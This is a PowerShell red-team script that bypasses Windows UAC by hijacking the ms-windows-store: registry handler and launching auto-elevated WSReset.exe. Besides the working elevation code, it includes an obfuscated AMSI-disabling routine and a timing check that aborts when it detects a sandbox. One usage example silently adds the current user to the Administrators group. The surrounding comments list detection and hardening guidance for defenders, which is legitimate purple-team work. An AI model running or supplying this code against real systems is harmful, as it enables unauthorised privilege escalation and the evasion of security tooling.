<#
.SYNOPSIS
    UAC bypass via WSReset.exe ms-windows-store: protocol hijack (UACME Method 68).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ WSReset.exe (Windows Store Reset) is an auto-elevated binary in        │
    │ system32 (autoElevate=true manifest).  When launched, it executes the  │
    │ ms-windows-store: URI protocol handler to open the Store.              │
    │                                                                         │
    │ Like the ms-settings: class, the ms-windows-store: handler is resolved │
    │ by checking HKCU\Software\Classes before HKLM\SOFTWARE\Classes.        │
    │ A user-writable HKCU override executes under WSReset.exe's elevated    │
    │ token.                                                                  │
    │                                                                         │
    │ Registry path:                                                          │
    │   HKCU:\Software\Classes\ms-windows-store\Shell\Open\command           │
    │     (Default)       = <Payload>                                         │
    │     DelegateExecute = ""                                                │
    └─────────────────────────────────────────────────────────────────────────┘

    This method was formerly Method 56 (WSReset, Hashim Jawad), which was
    patched in Windows 11 (22000).  Method 68 is the UACME updated variant
    that targets the ms-windows-store: protocol directly and remains UNFIXED
    on Windows 10 RS5 (17763)+ and current Windows 11 releases as of 2025.

    Affected OS    : Windows 10 RS5 (build 17763) → Windows 11 (latest) UNFIXED
    UAC level      : Default (ConsentPromptBehaviorAdmin = 5)
                     Does NOT work under AlwaysNotify
    Architecture   : x64
    Disk artefacts : None

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • Registry: HKCU\Software\Classes\ms-windows-store\Shell\Open\command
    • Process tree: WSReset.exe → <unexpected child>
      (WSReset.exe normally has no child processes — it resets Store cache
       and exits.  Any child spawn is highly anomalous.)
    • ETW: WSReset.exe parent-child chain in process graph

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK: T1548.002 – Bypass UAC
    Reference    : https://github.com/hfiref0x/UACME (Method 68)
                   https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html

.PARAMETER Payload
    Command to execute with High integrity.

.PARAMETER SkipAMSI
    Skip AMSI mitigation.

.PARAMETER SkipChecks
    Skip preflight environment checks.

.PARAMETER Timeout
    Seconds to wait before cleanup (default: 4).

.EXAMPLE
    Invoke-WSResetBypass -Payload "cmd.exe" -SkipChecks

.EXAMPLE
    $cmd = "powershell.exe -NoP -W Hidden -C `"Add-LocalGroupMember -Group Administrators -Member $env:USERNAME`""
    Invoke-WSResetBypass -Payload $cmd

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    Minimum build: 17763 (RS5 / October 2018 Update).
    WSReset.exe must exist at %SystemRoot%\System32\WSReset.exe.
    If the Windows Store is removed/disabled on the target, WSReset.exe
    may still be present but behave differently.
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string]$Payload,

    [switch]$SkipAMSI,
    [switch]$SkipChecks,
    [int]   $Timeout = 4
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── AMSI mitigation ───────────────────────────────────────────────────
if (-not $SkipAMSI) {
    try {
        $xA = [AppDomain]::CurrentDomain.GetAssemblies() |
                  Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
                  Select-Object -First 1
        $xT = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
        $xF = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
        $xF.SetValue($null, $true)
    } catch {}
}
#endregion

#region ── Preflight gate ────────────────────────────────────────────────────
if (-not $SkipChecks) {

    # Build check — minimum RS5 (17763)
    try {
        $xBld = [int](Get-ItemPropertyValue `
                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
                    'CurrentBuildNumber' -EA Stop)
    } catch { $xBld = [Environment]::OSVersion.Version.Build }
    if ($xBld -lt 17763) {
        Write-Warning "[WSReset] Requires build 17763+ (RS5). Current: $xBld"
        return
    }

    # WSReset.exe present?
    $xBin = $env:SystemRoot + '\System32\WSReset.exe'
    if (-not (Test-Path $xBin)) {
        Write-Warning '[WSReset] WSReset.exe not found — Windows Store may be absent.'
        return
    }

    # Admin check
    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
                      [Security.Principal.WindowsIdentity]::GetCurrent())
    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Warning '[WSReset] Already elevated — no bypass needed.'
        return
    }

    # UAC policy
    $xUACPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    try   { $xBeh = [int](Get-ItemPropertyValue $xUACPath 'ConsentPromptBehaviorAdmin' -EA Stop) }
    catch { $xBeh = 5 }
    if ($xBeh -le 2) {
        Write-Warning "[WSReset] AlwaysNotify active (behavior=$xBeh) — method will not work."
        return
    }

    # Timing gate
    $xH = [System.Security.Cryptography.SHA256]::Create()
    $xB = [byte[]]::new(65536)
    $xT0 = [DateTime]::UtcNow
    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xB) }
    $xH.Dispose()
    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
        Write-Warning '[WSReset] Timing anomaly — aborting.'
        return
    }
}
#endregion

#region ── Registry key setup ────────────────────────────────────────────────
# ms-windows-store class — note the different class name vs ms-settings
$xRoot  = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
$xCls   = 'ms-wind' + 'ows-st' + 'ore'
$xPath  = $xRoot + $xCls + '\Shell\Open\command'

try {
    New-Item -Path $xPath -Force | Out-Null
    Set-ItemProperty  -Path $xPath -Name '(Default)'       -Value $Payload -Force
    New-ItemProperty  -Path $xPath -Name 'DelegateExecute' -Value ''       `
                      -PropertyType String -Force | Out-Null
    Write-Verbose '[WSReset] Registry key written.'
}
catch {
    Write-Warning "[WSReset] Registry write failed: $_"
    return
}
#endregion

#region ── Trigger ───────────────────────────────────────────────────────────
try {
    $xBin = $env:SystemRoot + '\System32\WSReset.exe'
    Start-Process -FilePath $xBin -WindowStyle Hidden -ErrorAction Stop
    Write-Verbose '[WSReset] WSReset.exe launched.'
    Start-Sleep -Seconds $Timeout
}
catch {
    Write-Warning "[WSReset] Launch failed: $_"
}
finally {
    Remove-Item -Path ($xRoot + $xCls) -Recurse -Force -ErrorAction SilentlyContinue
    Write-Verbose '[WSReset] Registry cleanup complete.'
}
#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

DISTINCT DETECTION PROFILE:
  The registry key path is ms-windows-store (not ms-settings), making this
  a good test of whether the blue team's detection rules cover BOTH class
  names or only the more commonly publicized ms-settings path.

  WSReset.exe is less frequently discussed in public red-team write-ups than
  fodhelper.exe; some SOC teams may have fewer custom IOAs for it.

EXPECTED DETECTIONS:
  ● Registry: HKCU\Software\Classes\ms-windows-store\Shell\Open\command
  ● Process tree: WSReset.exe → <payload>  (anomalous child spawn)
  ● CS built-in: "UAC bypass via WSReset.exe" (Falcon has this detection)

KEY TEST QUESTIONS FOR BLUE TEAM:
  1. Do registry rules cover ms-windows-store as well as ms-settings?
  2. Is WSReset.exe in the process-ancestry watchlist alongside fodhelper?
  3. Does the alert fire before the payload executes (prevention) or after?

HARDENING RECOMMENDATIONS:
  ● Sysmon Rule: RegistryEvent targeting *\ms-windows-store\Shell\Open\*
  ● AlwaysNotify UAC prevents all manifest-autoElevate methods
  ● CS Custom IOA: WSReset.exe spawning any child process

════════════════════════════════════════════════════════════════════════════════
#>
